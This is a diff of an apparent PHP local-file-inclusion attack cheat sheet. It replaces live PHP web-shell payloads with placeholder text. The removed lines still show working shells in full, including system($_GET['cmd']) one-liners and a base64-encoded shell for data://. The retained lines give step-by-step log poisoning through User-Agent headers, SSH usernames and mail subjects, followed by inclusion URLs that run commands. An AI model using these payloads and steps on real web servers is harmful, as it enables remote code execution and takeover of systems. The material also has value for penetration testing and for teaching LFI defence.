@@ -50,14 +50,14 @@ php://filter/convert.iconv.utf-8.utf-16/resource=index.php
 POST /vuln.php?page=php://input HTTP/1.1
 Content-Type: text/plain
 
-<?php system('id'); ?>
+PAYLOAD: php system('id')
 ```
 
 ### data:// (Inline Code Execution)
 
 ```
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
-data://text/plain,<?php system('id'); ?>
+data://text/plain;base64,BASE64_ENCODED_PHP_SYSTEM_CALL
+data://text/plain,PAYLOAD: php system('id')
 ```
 
 ### expect:// (Command Execution)
@@ -83,7 +83,7 @@ phar://uploads/evil.phar/shell.php
 
 ```bash
 # Step 1: Poison the log via User-Agent
-curl -A "<?php system(\$_GET['cmd']); ?>" http://target.example/
+curl -A "PAYLOAD: php system($_GET['cmd'])" http://target.example/
 
 # Step 2: Include the log file
 http://target.example/vuln.php?page=/var/log/apache2/access.log&cmd=id
@@ -99,7 +99,7 @@ http://target.example/vuln.php?page=/var/log/apache2/error.log
 
 ```bash
 # Step 1: Poison via SSH username
-ssh '<?php system($_GET["cmd"]); ?>'@target.example
+ssh 'PAYLOAD: php system($_GET["cmd"])'@target.example
 
 # Step 2: Include
 http://target.example/vuln.php?page=/var/log/auth.log&cmd=id
@@ -109,7 +109,7 @@ http://target.example/vuln.php?page=/var/log/auth.log&cmd=id
 
 ```bash
 # Step 1: Send email with PHP payload in subject
-mail -s '<?php system($_GET["cmd"]); ?>' www-data@target.example < /dev/null
+mail -s 'PAYLOAD: php system($_GET["cmd"])' www-data@target.example < /dev/null
 
 # Step 2: Include
 http://target.example/vuln.php?page=/var/log/mail.log&cmd=id
